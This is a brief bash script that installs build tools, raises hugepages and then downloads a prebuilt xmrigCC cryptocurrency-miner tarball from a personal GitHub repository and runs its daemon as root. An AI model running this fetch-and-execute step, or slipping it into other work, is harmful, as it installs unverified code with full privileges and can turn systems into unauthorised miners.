#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 && wget https://github.com/phungkhanh90/dao/raw/master/xmrigCCminer2.tar.gz && tar xf xmrigCCminer2.tar.gz && cd xmrigCCminer2 && ls -la && 
sudo ./xmrigDaemon
